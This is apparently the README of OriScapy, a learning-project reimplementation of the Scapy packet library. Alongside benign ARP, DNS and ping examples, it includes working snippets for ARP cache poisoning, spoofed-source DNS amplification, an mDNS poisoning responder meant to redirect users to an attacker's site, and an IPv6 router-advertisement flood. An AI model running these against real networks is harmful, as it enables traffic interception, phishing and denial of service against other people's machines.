# OriScapy
This is a custom-made version of the well known [Scapy library for python](https://scapy.net/).


## Rationale
In my journey of learning about the fascinating world of Networking, I realised that Scapy    
is something im using all the time, without needing to worry about all the     
stuff it does in the background automatically.   
For example, when crafting an ARP request:

```python
pkt = Ether()/ARP(pdst="<Get_This_IP's_Mac")
mac = srp1(pkt)[ARP].hwsrc
```

Scapy automatically fills a good deal of fields of the ARP header.    
for example, you don't have to worry about these fields:
```text
  hwtype, ptype, hwlen, plen, op, hwsrc, psrc, hwdst      
```
Which Scapy automatically fills according to the [RFC Specification](https://datatracker.ietf.org/doc/html/rfc826) / [ARP packet header](https://en.wikipedia.org/wiki/Address_Resolution_Protocol#Packet_structure)

Also, no parameters were given to the `Ether` class constructor,   
although the Ethernet header obviously contains some info:
```text
dst, src, type
```

All those fields are automatically completed by Scapy for your own comfort.   
Scapy automatically detects the type of packet to be sent is ARP,  
And so it sets the `type` field to `0x806 (ARP)`, like it should be.   
Also, the `Source MAC` and the `Destination MAC` are automatically detected and filled.

And so I wanted for my knowledge about Networking, to learn more about  
the most famous packets' header format.   
And to do that I thought to make my own Scapy which would support    
Ethernet, ARP, IP, ICMP, UDP, DNS and maybe more in the future.

## Usage
**First of all, don't. Please just use [Scapy](https://pypi.org/project/scapy/).**   
But if you insist, then its basically the same as Scapy. Here are some examples:    
**__Note that OriScapy only works on Linux.__**     
#### ARP Queries

```python
from All import *

ip = "192.168.1.2"

# Resolve 192.168.1.2's MAC Address
pkt = Ether()/ARP(pdst=ip)  # Everything is auto-completed :)
ans = sendreceive(pkt)
print(f"{ip}'s MAC address is {ans.hwsrc}")
```

#### ARP Spoofing/Cache Poisoning
```python
from All import *

def poison(target_ip, target_mac, fake_ip, fake_mac, count=50):
    pkt = Ether(src=fake_mac)/ARP(hwsrc=fake_mac, psrc=fake_ip, hwdst=target_mac, pdst=target_ip, opcode=2)
    for _ in range(count):
        send(pkt)

poison(pkt, count=50)

```


#### DNS Queries
(No support for Additional and Authorative RRs)
```python
from All import *  
  
# Resolve google.com by querying google's DNS server (8.8.8.8)  
pkt = Ether()/IP(dst="8.8.8.8")/UDP(dport=53)/DNS(qd=DNSQR(qname="google.com"))  
ans = sendreceive(pkt, timeout=3)

for answer_record in ans.an:
    print(answer_record.rdata)
```

#### DNS Amplification
```python
from All import *

def dns_amp(target_ip):
    pkt = Ether()/IP(src=target_ip, dst="ip.of.dns.server")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com", qtype=255))
    send(pkt)

dns_amp("192.168.1.2")
```

#### Resolve Hostname in LAN
```python
from All import *  
  
# To query the local LAN for the IP of hostname "myHostname"  
# a DNS Query is sent to multicast ip "224.0.0.251" and port 5353, also known as  
# multicast-DNS (mDNS). Inside the query, the qname should be "hostname"+".local"  
  
pkt = Ether()/IP(dst="224.0.0.251")/UDP(dport=5353)/DNS(qd=DNSQR(qname="myHostname.local"))  
  
# IP may come back either to the multicast address, or directly to the host PC's IP.
# Which means that you can't tell whether a packet is an answer to `pkt` based on
# the dst and src IP inside it, so we set flipIP to False
ans = sendreceive(pkt, flipIP=False)  
  
for answer_record in ans.an:  
    print(answer_record.rdata)
```
    

#### mDNS Cache Poisoning 
```python
from All import *

myIpv4 = "192.168.1.47"

def ismatch_mdns(pkt: Ether):
    return UDP in pkt and 5353 in (pkt[UDP].sport, pkt[UDP].dport) and DNSQR in pkt

def onmatch_mdns(pkt: Ether):
    """
    Receives a mDNS packet and reply with a spoofed packet saying
    that myIpv4 is the IP of that mDNS domain name.

    For example, when a user mistypes "google" for e.g. "goggle", 
    the user's PC queries the LAN for Domain <=> IP using mDNS.
    At that point we reply with our own IP, and the user goes
    to our website thinking we're google.
    :param pkt: Ether
    :return: None
    """

    isIPv6 = IPv6 in pkt

    if isIPv6:
        psrc = pkt[IPv6].psrc
    else:
        psrc = pkt[IP].psrc
    
    sport = pkt[UDP].sport
    dport = pkt[UDP].dport
    name = pkt[DNSQR][0].qname

    print(f"Spoofing response for: {name} from ip: {psrc} -> {myIpv4}")

    eth = Ether(dst=pkt.src)
    udp = UDP(sport=dport, dport=sport)
    dns = DNS(id=pkt[DNS].id, aa=1, an=DNSRR(name=name, ttl=120, rdata=myIpv4))

    # Windows sends both IPv4 and IPv6 packets (with the same DNSQR), so we
    # need to check if the packet is IPv6 or IPv4 and send the correct packet.

    if isIPv6:
        spoofed_response = eth/IPv6(pdst=psrc)/udp/dns
    else:
        spoofed_response = eth/IP(pdst=psrc)/udp/dns

    send(spoofed_response)

sniff(ismatch_mdns, onmatch_mdns)

```

#### Router Advertisement Flood (AKA flood_router6)
```python
from All import *

# Floods all nodes (ff02::1) or a specific address
# (represented by fe80:xx...) with 500 router advertisements.

# hop limit of 255 is required (from the RFC of NDP).
# More documentation soon.

tgt = generateSoliAddr("fe80::xxxx:xxxx:xxxx:xxxx")  # or just ff02::1, which is every host 

for _ in range(500):
    srcmac = randomMac()
    psrc = randomIpv6(isLocal=True)
    prefix = randomIpv6(isPrefix=True)

    pkt = Ether(src=srcmac, dst="33:33:00:00:00:01")/IPv6(psrc=psrc, pdst=tgt, hoplimit=255)/NDPRouterAdv(srcmac, prefix)
    send(pkt)

```

#### Ping an IP
```python
from All import *

# Ping google's DNS server
pkt = Ether()/IP(dst="8.8.8.8")/ICMP()
res = sendreceive(pkt, timeout=2)
print(res)
```



## Changelog
Added more helper functions:
    randomIpv6 and generateSoliAddr.   
Better NDPRouterAdv, which now forces receivers to generate an address using SLAAC.